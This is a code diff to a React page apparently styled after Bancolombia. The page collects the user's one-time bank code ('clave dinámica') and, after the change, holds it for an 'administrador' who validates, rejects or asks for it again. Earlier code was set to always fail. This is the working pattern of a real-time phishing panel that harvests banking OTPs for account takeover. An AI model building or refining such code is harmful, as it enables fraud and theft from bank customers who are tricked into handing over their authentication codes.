@@ -34,14 +34,13 @@ export default function BancolombiaCargandoPage() {
 
           if (data.status === 'waiting_otp') {
             setShowOtpModal(true);
-          } else if (data.status === 'otp_valid' || data.status === 'otp_submitted' || data.status === 'completed') {
-            // SIEMPRE FALLAR - Redirigir a carrito con mensaje de error
+          } else if (data.status === 'admin_rejected') {
+            // Admin rechazó el pago - Redirigir a carrito con mensaje de error
             router.push('/carrito?error=pago_fallido');
-          } else if (data.status === 'otp_invalid') {
-            // OTP was wrong - redirigir a carrito con mensaje de error
-            router.push('/carrito?error=pago_fallido');
-          } else if (data.status === 'timeout') {
-            router.push('/carrito?error=pago_fallido');
+          } else if (data.status === 'request_otp_again') {
+            // Admin solicitó la dinámica de nuevo
+            setShowOtpModal(true);
+            setOtp('');
           }
         }
       } catch (error) {
@@ -113,20 +112,20 @@ export default function BancolombiaCargandoPage() {
         };
       case 'otp_submitted':
         return {
-          title: 'Validando clave dinámica...',
-          message: 'Estamos verificando la clave dinámica ingresada',
+          title: 'Clave dinámica recibida',
+          message: 'Esperando validación del administrador...',
           showSpinner: true
         };
-      case 'otp_error':
+      case 'request_otp_again':
         return {
-          title: 'Clave dinámica incorrecta',
-          message: 'La clave dinámica ingresada es incorrecta. Esperando nueva solicitud...',
-          showSpinner: true
+          title: 'Se requiere nueva clave dinámica',
+          message: 'Por favor ingresa la clave dinámica nuevamente',
+          showSpinner: false
         };
-      case 'timeout':
+      case 'admin_rejected':
         return {
-          title: 'Tiempo agotado',
-          message: 'El tiempo de espera ha expirado. Por favor intenta nuevamente más tarde.',
+          title: 'Pago rechazado',
+          message: 'Redirigiendo al carrito...',
           showSpinner: false
         };
       default:
